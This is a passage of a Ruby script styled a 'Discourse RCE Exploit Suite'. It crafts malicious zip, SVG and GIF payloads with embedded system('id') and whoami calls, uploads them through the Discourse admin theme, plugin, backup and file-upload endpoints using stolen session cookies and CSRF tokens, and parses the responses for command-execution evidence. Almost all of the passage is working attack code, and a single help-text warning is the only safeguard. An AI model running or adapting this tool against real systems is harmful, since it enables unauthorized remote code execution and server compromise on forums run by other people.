      zipfile.get_output_stream('evil.rb') do |f|
        f.puts 'system("id")'
        f.puts '`whoami`'
      end
    end
    
    zip_file
  end
  
  def create_malicious_svg
    <<~SVG
      <?xml version="1.0" standalone="no"?>
      <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
      <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
        <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
        <script type="text/javascript">
          // <%= system('id') %>
          alert('SVG RCE');
        </script>
      </svg>
    SVG
  end
  
  def create_malicious_gif
    # Simple GIF header with embedded code comment
    "GIF89a\x01\x00\x01\x00\x00\x00\x00!\xF9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;<%= system('id') %>"
  end
  
  def upload_theme(theme_zip)
    boundary = "----WebKitFormBoundary#{rand(1000000000)}"
    
    form_data = "--#{boundary}\r\n"
    form_data += "Content-Disposition: form-data; name=\"theme\"; filename=\"malicious_theme.zip\"\r\n"
    form_data += "Content-Type: application/zip\r\n\r\n"
    form_data += theme_zip.read
    form_data += "\r\n--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}",
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(URI("#{@target_url}/admin/themes/import"), 'POST', form_data, headers)
  end
  
  def upload_plugin(plugin_zip)
    boundary = "----WebKitFormBoundary#{rand(1000000000)}"
    
    form_data = "--#{boundary}\r\n"
    form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"malicious_plugin.zip\"\r\n"
    form_data += "Content-Type: application/zip\r\n\r\n"
    form_data += plugin_zip.read
    form_data += "\r\n--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}",
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(URI("#{@target_url}/admin/plugins/upload"), 'POST', form_data, headers)
  end
  
  def restore_backup(backup_file)
    boundary = "----WebKitFormBoundary#{rand(1000000000)}"
    
    form_data = "--#{boundary}\r\n"
    form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"malicious_backup.tar.gz\"\r\n"
    form_data += "Content-Type: application/gzip\r\n\r\n"
    form_data += backup_file.read
    form_data += "\r\n--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}",
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(URI("#{@target_url}/admin/backups/upload"), 'POST', form_data, headers)
  end
  
  def upload_file(filename, content, content_type)
    boundary = "----WebKitFormBoundary#{rand(1000000000)}"
    
    form_data = "--#{boundary}\r\n"
    form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"#{filename}\"\r\n"
    form_data += "Content-Type: #{content_type}\r\n\r\n"
    form_data += content
    form_data += "\r\n--#{boundary}--\r\n"
    
    headers = {
      'Content-Type' => "multipart/form-data; boundary=#{boundary}",
      'X-CSRF-Token' => @csrf_token || ''
    }
    
    make_request(URI("#{@target_url}/uploads"), 'POST', form_data, headers)
  end

  def check_rce_success(response, test_type)
    return false unless response
    
    content = response.body.downcase
    
    # Check for command execution indicators
    rce_indicators = [
      'uid=', 'gid=', 'groups=',  # id command output
      'root:', 'daemon:', 'bin:',  # /etc/passwd content
      'www-data', 'apache', 'nginx',  # common web server users
      'system error', 'execution error',
      'command not found', 'permission denied',
      'ruby:', 'rails:', 'discourse:',  # Ruby/Rails errors
      'eval error', 'syntax error'
    ]
    
    rce_indicators.each do |indicator|
      return true if content.include?(indicator)
    end
    
    # Check for successful file upload/processing
    case test_type
    when 'theme_upload', 'plugin_upload'
      return true if response.code.to_i == 200 && (content.include?('success') || content.include?('imported'))
    when 'backup_restore'
      return true if response.code.to_i == 200 && content.include?('restore')
    when 'executable_upload', 'archive_extraction', 'image_processing'
      return true if response.code.to_i == 200 && content.include?('upload')
    end
    
    # Check for error responses that might indicate RCE attempt
    return true if response.code.to_i == 500
    
    false
  end

  def extract_rce_evidence(response)
    evidence = []
    content = response.body
    
    # Extract command output
    uid_match = content.match(/uid=(\d+)\([^)]+\)/)
    evidence << "Command output: #{uid_match[0]}" if uid_match
    
    # Extract error messages
    error_match = content.match(/(Error|Exception|Fatal):\s*([^\n]+)/i)
    evidence << "Error message: #{error_match[2]}" if error_match
    
    # Extract file paths
    path_match = content.match(/\/[a-zA-Z0-9\/._-]+/)
    evidence << "File path: #{path_match[0]}" if path_match
    
    # Extract Ruby/Rails specific errors
    ruby_match = content.match(/(NoMethodError|NameError|SyntaxError):\s*([^\n]+)/i)
    evidence << "Ruby error: #{ruby_match[2]}" if ruby_match
    
    evidence
  end

  def make_request(uri, method = 'GET', body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @timeout
    
    # Set up proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    request = case method.upcase
              when 'GET'
                Net::HTTP::Get.new(uri)
              when 'POST'
                Net::HTTP::Post.new(uri)
              when 'PUT'
                Net::HTTP::Put.new(uri)
              else
                Net::HTTP::Get.new(uri)
              end
    
    # Set headers
    request['User-Agent'] = @user_agent
    request['Accept'] = 'application/json, text/javascript, */*; q=0.01'
    request['Accept-Language'] = 'en-US,en;q=0.9'
    
    # Add session cookies
    if !@session_cookies.empty?
      cookie_string = @session_cookies.map { |k, v| "#{k}=#{v}" }.join('; ')
      request['Cookie'] = cookie_string
    end
    
    # Add custom headers
    headers.each { |k, v| request[k] = v }
    
    # Set body for POST/PUT requests
    if body && ['POST', 'PUT'].include?(method.upcase)
      request.body = body
      request['Content-Type'] = 'application/x-www-form-urlencoded' unless headers['Content-Type']
    end
    
    begin
      response = http.request(request)
      
      # Update session cookies
      response.get_fields('set-cookie')&.each do |cookie|
        cookie_parts = cookie.split(';')[0].split('=')
        @session_cookies[cookie_parts[0]] = cookie_parts[1] if cookie_parts.length == 2
      end
      
      response
    rescue => e
      puts "[!] Request failed: #{e.message}"
      nil
    end
  end

  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end

  def make_put_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'PUT', body, {
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end

  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE RCE TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Payload: #{vuln[:payload][0..80]}..."
        puts "     Method: #{vuln[:method]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end

  def save_results
    filename = 'discourse_rce_results.json'
    File.write(filename, JSON.pretty_generate(@results))
    puts "\n[*] Results saved to #{filename}"
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  
  options = {}
  OptionParser.new do |opts|
    opts.banner = "Discourse RCE Exploit Suite\n\n"
    opts.banner += "Usage: ruby discourse_rce.rb [options] TARGET_URL\n\n"
    
    opts.on('--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('--timeout TIMEOUT', Integer, 'Request timeout (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help') do
      puts opts
      puts "\nExample:"
      puts "  ruby discourse_rce.rb https://discourse.example.com"
      puts "\nWARNING: Use only on systems you own or have explicit permission to test!"
      exit
    end
  end.parse!
  
  if ARGV.empty?
    puts "Error: Target URL required"
    puts "Use --help for usage information"
    exit 1
  end
  
  target_url = ARGV[0]
  
  begin
    exploit = DiscourseRCE.new(target_url, options)
    results = exploit.run_all_tests
    
    if results[:vulnerable]
      puts "\nðŸš¨ CRITICAL: RCE vulnerabilities found!"
      puts "   Remote code execution and server compromise possible!"
    else
      puts "\nâœ… No RCE vulnerabilities detected"
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
  rescue => e
    puts "\n[!] Testing failed: #{e.message}"
  end
end